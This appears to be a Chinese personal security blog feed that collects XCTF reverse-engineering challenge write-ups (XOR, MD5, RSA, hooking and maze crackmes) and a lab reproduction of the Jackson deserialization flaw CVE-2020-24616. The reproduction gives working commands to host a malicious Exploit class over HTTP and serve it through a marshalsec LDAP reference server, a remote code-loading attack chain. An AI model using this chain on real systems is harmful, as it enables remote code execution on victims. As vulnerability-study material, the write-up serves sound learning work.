<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027183147009.png" alt="image-20201027183147009"></p>
<h5 id="0x04-easyre（python异或）"><a href="#0x04-easyre（python异或）" class="headerlink" title="0x04 easyre（python异或）"></a>0x04 easyre（python异或）</h5><p>IDA分析关键函数，输入字符串为v7，长度为24，并且做了以下操作，其中unk_402158是已知的数据</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028092543787.png" alt="image-20201028092543787"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028092904689.png" alt="image-20201028092904689"></p>
<p>编写脚本即可跑出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182905474.png" alt="image-20201027182905474"></p>
<p><strong>注意：Python中异或要加个括号，不加会先运行6-1</strong></p>
<h5 id="0x05-re-for-50-piz（mips）"><a href="#0x05-re-for-50-piz（mips）" class="headerlink" title="0x05 re-for-50-piz（mips）"></a>0x05 re-for-50-piz（mips）</h5><p>IDA分析，发现和以往的代码都不太一样，载入的时候IDA也提示是MIPS</p>
<p>参考：<a href="https://blog.csdn.net/qq_42967398/article/details/94845416">https://blog.csdn.net/qq_42967398/article/details/94845416</a></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100333224.png" alt="image-20201028100333224"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028100408292.png" alt="image-20201028100408292"></p>
<h5 id="0x06-dmd-50"><a href="#0x06-dmd-50" class="headerlink" title="0x06 dmd-50"></a>0x06 dmd-50</h5><p>IDA分析关键函数，要求输入Key的值</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182604719.png" alt="image-20201027182604719"></p>
<p>可以看到输出，所以需要进下面的判定</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182542427.png" alt="image-20201027182542427"></p>
<p>所以输入要等于41里的值，将41的值拖出来用Md5解密即可</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182629949.png" alt="image-20201027182629949"></p>
<h5 id="0x07-parallel-comparator-200（爆破）"><a href="#0x07-parallel-comparator-200（爆破）" class="headerlink" title="0x07 parallel-comparator-200（爆破）"></a>0x07 parallel-comparator-200（爆破）</h5><p>直接可以看源码分析：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182101171.png" alt="image-20201027182101171"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180417612.png" alt="image-20201027180417612"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027182054092.png" alt="image-20201027182054092"></p>
<p>所以编写一个脚本就可以了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180404777.png" alt="image-20201027180404777"></p>
<p><strong>注意：由于生成的是随机数，所以需要爆破一下</strong></p>
<h5 id="0x08-secret-galaxy-300（运行时堆栈中）"><a href="#0x08-secret-galaxy-300（运行时堆栈中）" class="headerlink" title="0x08 secret-galaxy-300（运行时堆栈中）"></a>0x08 secret-galaxy-300（运行时堆栈中）</h5><p>这个题比较神奇</p>
<p>主函数：看到调用了fill和print</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180024719.png" alt="image-20201027180024719"></p>
<p>fill函数:给一堆变量赋值了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180045329.png" alt="image-20201027180045329"></p>
<p>打印出这些值</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180116127.png" alt="image-20201027180116127"></p>
<p>动态运行看看：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180133857.png" alt="image-20201027180133857"></p>
<p>也没有什么输出也没有什么flag的信息</p>
<p>但是在动态调试的时候在堆栈中意外发现了flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027180225886.png" alt="image-20201027180225886"></p>
<h5 id="0x09-srm-50（十六进制转字符串）"><a href="#0x09-srm-50（十六进制转字符串）" class="headerlink" title="0x09 srm-50（十六进制转字符串）"></a>0x09 srm-50（十六进制转字符串）</h5><p>IDA分析关键函数</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175822604.png" alt="image-20201027175822604"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175734844.png" alt="image-20201027175734844"></p>
<p>可以查看到410A80等的值，十六进制转字符串即可，最终可直接看出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201028093014322.png" alt="image-20201028093014322"></p>
<p><img src="/Users/kami/Desktop/%E7%AC%94%E8%AE%B0/%E9%80%86%E5%90%91/CTF%E9%80%86%E5%90%91%E9%A2%98/typora-user-images/image-20201027175748471.png" alt="image-20201027175748471"></p>
<h5 id="0x0A-simple-check-100（linux动态调试）"><a href="#0x0A-simple-check-100（linux动态调试）" class="headerlink" title="0x0A simple-check-100（linux动态调试）"></a>0x0A simple-check-100（linux动态调试）</h5><p>IDA分析关键函数，是对输入的Key进行一个check操作，然后会对v8运行interesting_function</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174951320.png" alt="image-20201027174951320"></p>
<p>check函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175030634.png" alt="image-20201027175030634"></p>
<p>interesting函数：可以看到是v3和flag_data做异或</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175211284.png" alt="image-20201027175211284"></p>
<p>Flagdata：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175058496.png" alt="image-20201027175058496"></p>
<p>有点复杂，选择动态调试，想看看直接绕过输出，结果是一堆乱码</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027175502311.png" alt="image-20201027175502311"></p>
<p>最后得知需要在Linux下进行动态调试，即可得到flag</p>
<h5 id="0x0B-Mysterious（atoi函数）"><a href="#0x0B-Mysterious（atoi函数）" class="headerlink" title="0x0B Mysterious（atoi函数）"></a>0x0B Mysterious（atoi函数）</h5><p>IDA分析关键函数，可以看到只要知道v5的内容就可以了</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027174533035.png" alt="image-20201027174533035"></p>
<p>一开始去分析atoi函数了，但是分析了半天没有弄懂，后来发现这是固定的函数，和itoa对应，是字符串如’123’转整数123</p>
<p>char *itoa (int value, char *str, int base ); </p>
<p>返回值：返回指向str的指针，无错误返回。</p>
<p>int value 被转换的整数，char *string 转换后储存的字符数组，int radix 转换进制数，如2,8,10,16 进制等，大小应在2-36之间。</p>
<p>所以输入的字符串为’122xyz’，即可得到flag</p>
<h5 id="0x0C-newbie-calculations（计算器思路）"><a href="#0x0C-newbie-calculations（计算器思路）" class="headerlink" title="0x0C newbie_calculations（计算器思路）"></a>0x0C newbie_calculations（计算器思路）</h5><p>看题目知道这是个计算器题</p>
<p>IDA分析，函数调用很复杂</p>
<p>参考：<a href="https://www.cnblogs.com/DirWang/p/11586159.html">https://www.cnblogs.com/DirWang/p/11586159.html</a></p>
<p>思路就是：因为没有输入，所以只是对固定数值进行的计算操作，对出现的401100，401000,401220函数进行分析，然后自己用熟悉的语言重写一下，然后复制这段代码运行即可得出flag</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173642989.png" alt="image-20201027173642989"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173844498.png" alt="image-20201027173844498"></p>
<h5 id="0x0D-re1-100"><a href="#0x0D-re1-100" class="headerlink" title="0x0D re1-100"></a>0x0D re1-100</h5><p>IDA分析，关键函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027172611785.png" alt="image-20201027172611785"></p>
<p>可以看出输入就是bufWrite</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027172650353.png" alt="image-20201027172650353"></p>
<p>所以输入字符串的长度为42，第一位和最后一位分别是{}，前十位是53fc275d81,后十位是4938ae4efd，最后经过一个混淆，要等于下面那个字符串</p>
<p>查看混淆的代码，就是分块处理了下各个字符串，换了下位置</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173036364.png" alt="image-20201027173036364"></p>
<p>最终换回来就得到flag了</p>
<h5 id="0x0E-answer-to-everything"><a href="#0x0E-answer-to-everything" class="headerlink" title="0x0E answer_to_everything"></a>0x0E answer_to_everything</h5><p>IDA分析关键函数</p>
<p>所以只要输入42，就可以得到一串字符：Cipher from Bill \nSubmit without any tags\n#kdudpeh</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201027173507303.png" alt="image-20201027173507303"></p>
<p>根据题目提示sha1加密和不需要加tag，变化一下就可以得到flag了</p>
<h5 id="0x0F-elrond32"><a href="#0x0F-elrond32" class="headerlink" title="0x0F elrond32"></a>0x0F elrond32</h5><h5 id="0x10-tt3441810"><a href="#0x10-tt3441810" class="headerlink" title="0x10 tt3441810"></a>0x10 tt3441810</h5><h5 id="0x11-re2-cpp-is-awesome（dword-dd）"><a href="#0x11-re2-cpp-is-awesome（dword-dd）" class="headerlink" title="0x11 re2-cpp-is-awesome（dword/dd）"></a>0x11 re2-cpp-is-awesome（dword/dd）</h5><p>IDA看看</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151235206.png" alt="image-20201102151235206"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151429640.png" alt="image-20201102151429640"></p>
<p>这个是主函数</p>
<p>可以看到sub_400B56函数：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151302390.png" alt="image-20201102151302390"></p>
<p>和sub_400B73函数</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151145960.png" alt="image-20201102151145960"></p>
<p>所以我们得知要满足判定条件</p>
<p>我们可以看到off_6020A0和dword_6020C0</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151547732.png" alt="image-20201102151547732"></p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102151634166.png" alt="image-20201102151634166"></p>
<p>那么我们只要编写脚本，满足判定条件即可</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103161236507.png" alt="image-20201103161236507"></p>
<p><strong>注意</strong>：dword代表是4个字节一位，align8代表8字节对齐，所以在0x24和5之间是有一个0的，汇编中dd代表4字节，dw代表2字节，db代表1字节</p>
<h5 id="0x12-re4-unvm-me（python3的int-函数和md5加解密）"><a href="#0x12-re4-unvm-me（python3的int-函数和md5加解密）" class="headerlink" title="0x12 re4-unvm-me（python3的int()函数和md5加解密）"></a>0x12 re4-unvm-me（python3的int()函数和md5加解密）</h5><p>是个后缀pyc的文件</p>
<p>直接拖进软件解出源码</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201102173720552.png" alt="image-20201102173720552"></p>
<p>只要将md5s中的数字转成十六进制后找md5解密网站解密即可，其中有一个少一位的在首位补上0</p>
<p><strong>注意</strong>：#int(‘0x’+n.hexdigest(),16))是将一个十六进制字符串（添加了’0x’让其变成了十六进制）转成十进制</p>
<h5 id="0x13-流浪者"><a href="#0x13-流浪者" class="headerlink" title="0x13 流浪者"></a>0x13 流浪者</h5><p>解开压缩包，是一个exe，运行，发现需要输入字符串然后点击验证按钮</p>
<p>放入IDA分析，在import里寻找getwindowstext函数，果然有</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155558866.png" alt="image-20201103155558866"></p>
<p>找到对应调用的函数，可以看到对输入的字符串进行了一些操作</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155618140.png" alt="image-20201103155618140"></p>
<p>跟下去看sub_4017F0,看到是根据变换后的字符串，然后再和aA这个数组进行变换，因为是dword类型，是四字节一位的，所以a1+4*v4就相当于a1[v4]，变换完后和对应字符串比较</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155652535.png" alt="image-20201103155652535"></p>
<p>aA这个数组如下：</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103155847933.png" alt="image-20201103155847933"></p>
<p>那么我们就可以编写脚本，最终可得到flag，其中对j判断的0，9，10等数字就是从字符串第一次变换里得到的范围</p>
<p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103161208429.png" alt="image-20201103161208429"></p>
<h5 id="第一页题目完成"><a href="#第一页题目完成" class="headerlink" title="第一页题目完成:"></a>第一页题目完成:</h5><p><img src="/2020/11/03/0x03Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-1/image-20201103160209798.png" alt="image-20201103160209798"></p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
  </entry>
  <entry>
    <title>0x04CVE-2020-24616复现</title>
    <url>/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h4 id="CVE-2020-24616复现"><a href="#CVE-2020-24616复现" class="headerlink" title="CVE-2020-24616复现"></a>CVE-2020-24616复现</h4><p>预警参考链接：<a href="https://s.tencent.com/research/bsafe/1102.html">https://s.tencent.com/research/bsafe/1102.html</a></p>
<p>8月底爆出的新漏洞，分析可参考:<a href="https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g">https://mp.weixin.qq.com/s/IICSnsSgwsjnbImgVP-y5g</a></p>
<a id="more"></a>

<p>参考CVE-2020-8840的复现流程，编写Poc，实现此漏洞复现</p>
<p>0x1 搭建一个Java项目，新建一个Poc类，下载并导入存在漏洞的包</p>
<img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171250748.png" alt="image-20200904171250748" style="zoom:50%;">

<p>0x2 可以直接本地充当服务端，也可使用另一台在同一局域网下的电脑充当服务端，两种方式经实验皆可成功复现，在此记录后者</p>
<p>编写exploid文件：</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904171609352.png" alt="image-20200904171609352"></p>
<p>这个操作是在Mac电脑下弹出计算器（注意：calculator.app的路径需根据实际情况填写）</p>
<p>对此java文件进行javac操作生成exploid.class，放到服务端上</p>
<p>开启服务端：</p>
<p>python3 -m http.server 8888</p>
<p>查看本机Ip后用python启动服务端（注意：python开启时要和exploid.class文件在同一文件夹下</p>
<p>启动LDAP：</p>
<p>java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer “<a href="http://x.x.x.x(服务端ip):8888/#Exploit&quot;">http://x.x.x.x(服务端Ip):8888/#Exploit&quot;</a> 9999</p>
<p>本机编写POC文件（java菜鸟写了好久才写出来poc</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20200904173651117.png" alt="image-20200904173651117"></p>
<p>运行POC文件,成功弹出计算器，此时服务端也有记录</p>
<p><img src="/2020/09/09/0x04CVE-2020-24616%E5%A4%8D%E7%8E%B0/image-20201109172340274.png" alt="image-20201109172340274"></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>jackson</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>0x04Xctf进阶刷题-2</title>
    <url>/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/</url>
    <content><![CDATA[<p>XCTF进阶刷题-2</p>
<a id="more"></a>

<h5 id="0x01-666"><a href="#0x01-666" class="headerlink" title="0x01 666"></a>0x01 666</h5><p>IDA分析</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174113594.png" alt="image-20201103174113594"></p>
<p>进入encode去看具体的加密操作，是几个异或操作，然后3个字符一组</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174237818.png" alt="image-20201103174237818"></p>
<p>编写脚本，flag就出来了</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201103174322010.png" alt="image-20201103174322010"></p>
<h5 id="0x02-signin-rsa算法"><a href="#0x02-signin-rsa算法" class="headerlink" title="0x02 signin-rsa算法"></a>0x02 signin-rsa算法</h5><p>rsa相关知识：</p>
<p><a href="https://www.52pojie.cn/thread-1100545-1-1.html">https://www.52pojie.cn/thread-1100545-1-1.html</a></p>
<p>ida查看主函数，根据算法特征得知是rsa算法</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110143659748.png" alt="image-20201110143659748"></p>
<p>以下函数的作用是将输入字符串转为十六进制ascii码字符串：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110144019734.png" alt="image-20201110144019734"></p>
<p>利用yafu分解（windows安装：<a href="https://blog.csdn.net/weixin_41603028/article/details/97167312%EF%BC%89%EF%BC%8C%E7%84%B6%E5%90%8E%E7%BC%96%E5%86%99%E8%84%9A%E6%9C%AC%E5%A6%82%E4%B8%8B%EF%BC%8C%E7%84%B6%E5%90%8E%E8%BD%AC%E6%8D%A2%E5%8D%B3%E5%8F%AF">https://blog.csdn.net/weixin_41603028/article/details/97167312），然后编写脚本如下，然后转换即可</a></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180421766.png" alt="image-20201110180421766"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110180133377.png" alt="image-20201110180133377"></p>
<p>问题：</p>
<p>python3一直无法导入gmpy2的包，只能用python2写了</p>
<h5 id="0x03-igniteme"><a href="#0x03-igniteme" class="headerlink" title="0x03 igniteme"></a>0x03 igniteme</h5><p>ida分析，主函数如下：</p>
<p>可以看到前四位和最后一位是定的，对v7做一个sub_4011C0函数的判断</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164753556.png" alt="image-20201110164753556"></p>
<p>跟进函数看看：</p>
<p>把值给了v8，然后v8经过一些操作变成v4，v4和最后的字符串相同</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110164900645.png" alt="image-20201110164900645"></p>
<p>查看unk_4420B0和sub_4013C0</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161046021.png" alt="image-20201110161046021"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110161059343.png" alt="image-20201110161059343"></p>
<p>编写脚本如下即可，然后转一下大小写</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110165109839.png" alt="image-20201110165109839"></p>
<h5 id="0x04-hackme（-amp-0xff）"><a href="#0x04-hackme（-amp-0xff）" class="headerlink" title="0x04 hackme（&amp;0xff）"></a>0x04 hackme（&amp;0xff）</h5><p>ida分析，找到主函数，分析一下就是，输入字符串，长度为22位，然后抽取其中的10位进行检验（可以看到数组byte_6B4270是22位的），检验方法就是v9和输入的字符串进行异或后要和固定的数组内容相同</p>
<p><strong>注意：循环10次不代表字符串只有10位</strong></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182250771.png" alt="image-20201110182250771"></p>
<p>查看byte_6B4270的内容</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201110182511109.png" alt="image-20201110182511109"></p>
<p>可以编写脚本如下：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111111154246.png" alt="image-20201111111154246"></p>
<p>要注意的是，v1[i]的值很大，需要和0xff相与，0xff最大值是255，由于整数值超过了255，所以用来控制</p>
<h5 id="0x05-ReverseMe"><a href="#0x05-ReverseMe" class="headerlink" title="0x05 ReverseMe"></a>0x05 ReverseMe</h5><p>ida分析：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201111143110520.png" alt="image-20201111143110520"></p>
<h5 id="0x06-easyre1"><a href="#0x06-easyre1" class="headerlink" title="0x06 easyre1"></a>0x06 easyre1</h5><p>打开ida就能看到，提交即可</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201113115339027.png" alt="image-20201113115339027"></p>
<h5 id="0x07-76号"><a href="#0x07-76号" class="headerlink" title="0x07 76号"></a>0x07 76号</h5><p>发现有个upx的壳，脱壳</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201125151636534.png" alt="image-20201125151636534"></p>
<p>放到ida分析，搜索字符串可以看到有correct字符，查找位置，找到主函数</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126113743706.png" alt="image-20201126113743706"></p>
<p>但是主函数反编译不出来，重要函数80485E0可以反编译，里面定义了很多变量和switch匹配，不是很理解，动态调试后发现就是匹配输入的字符串，v3就是输入的每一位，v5的由输入的字符串决定的位置是为1，然后再switch里做判断，最后return为1的话就正确</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126113826531.png" alt="image-20201126113826531"></p>
<p>然后就一位一位推测就可以了</p>
<p>一开始推到了15位，发现在14位的时候直接会跳转到0，研究后发现和v5数组有关，当输入的是h的时候，v11并不会为1，所以就会return 0</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126114240393.png" alt="image-20201126114240393"></p>
<p>找到对应关系后重新推测：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126114216580.png" alt="image-20201126114216580"></p>
<p>调试验证成功：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201126112823384.png" alt="image-20201126112823384"></p>
<h5 id="0x08-easyhook（hook）"><a href="#0x08-easyhook（hook）" class="headerlink" title="0x08 easyhook（hook）"></a>0x08 easyhook（hook）</h5><p>主函数，关键函数为sub_401220和sub_401240，然后创建了一个文件</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134415789.png" alt="image-20201116134415789"></p>
<p>运行一下，发现输入的字符串被改变了：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141148468.png" alt="image-20201116141148468"></p>
<p>动态调试一下，发现确实在这里写入的输入字符串被改变了</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116141519684.png" alt="image-20201116141519684"></p>
<p>401220:点进4010D0看看</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134620725.png" alt="image-20201116134620725"></p>
<p>4010D0:</p>
<p>Virtualprotectex修改了指定进程，hprocess和lpaddress是要更改的进程的句柄和页面区域的基地址的指针，5是访问保护属性已更改的区域的大小，以字节为单位。</p>
<p>Writeprocessmemory写入了指定数据，byte_40C9BC是指向缓冲区的指针，该缓冲区包含要在指定进程的地址空间中写入的数据。5是写入的数据大小</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134806821.png" alt="image-20201116134806821"></p>
<p>返回401220看看是怎么修改的</p>
<p>byte_40C9BC是0xE9，但是这只有一个字节，所以后四个字节就是40C9BD的内容，40C9BD和401080有关</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142056410.png" alt="image-20201116142056410"></p>
<p>401080:调用了sub_401000,lpbuffer指向包含要写入文件或设备的数据的缓冲区的指针。同时，真正flag的判定条件numer==1也是这里决定的</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142205966.png" alt="image-20201116142205966"></p>
<p>401000:可以看到对a1进行的操作，编写脚本即可</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116142459347.png" alt="image-20201116142459347"></p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116154606478.png" alt="image-20201116154606478"></p>
<p>401240:并没有什么作用</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116134559636.png" alt="image-20201116134559636"></p>
<h5 id="0x09-secret-string-400（js）"><a href="#0x09-secret-string-400（js）" class="headerlink" title="0x09 secret-string-400（js）"></a>0x09 secret-string-400（js）</h5><p>打开看是一个html和一个js文件，之前没接触过</p>
<p>打开html，是一个验证输入页面，随便输入一个字符串，会弹出nope</p>
<p>搜索了下怎么调试js，开始尝试在代码各处里加入console.log，然后f12查看输出情况</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171456917.png" alt="image-20201116171456917"></p>
<p>然后页面中出现了隐藏的代码：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116170210757.png" alt="image-20201116170210757"></p>
<p>根据这个代码写出脚本即可：</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116171607888.png" alt="image-20201116171607888"></p>
<h5 id="0x0A-easymaze"><a href="#0x0A-easymaze" class="headerlink" title="0x0A easymaze"></a>0x0A easymaze</h5><p>ida分析主函数</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201116172904202.png" alt="image-20201116172904202"></p>
<p>由于分析两个step函数比较复杂，且容易分析错，可以动态调试(linux下的远程动态调试)找出生成的迷宫，下断点，找v5的位置</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117091836672.png" alt="image-20201117091836672"></p>
<p>再看step2，告诉我们怎么走</p>
<p><img src="/2020/11/10/0x04Xctf%E8%BF%9B%E9%98%B6%E5%88%B7%E9%A2%98-2/image-20201117092345267.png" alt="image-20201117092345267"></p>
<p>根据迷宫走即可</p>
